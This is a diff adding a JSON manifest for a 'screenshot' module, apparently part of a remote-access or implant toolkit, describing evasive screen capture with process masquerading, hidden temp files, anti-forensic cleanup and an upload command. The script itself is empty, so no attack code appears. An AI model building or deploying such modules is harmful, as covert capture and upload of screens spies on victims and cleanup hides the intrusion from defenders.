@@ -1,0 +1,17 @@
+{
+  "name": "screenshot",
+  "version": "2.0.0",
+  "platform": "all",
+  "arch": "any",
+  "description": "Evasive screenshot capture \u2014 process masquerading, hidden temp files, multi-tool fallback, anti-forensic cleanup",
+  "type": "sh",
+  "commands": [
+    "screenshot_capture",
+    "screenshot_upload"
+  ],
+  "files": {
+    "screenshot.sh": ""
+  },
+  "author": "ruby570bocadito",
+  "evasive": true
+}
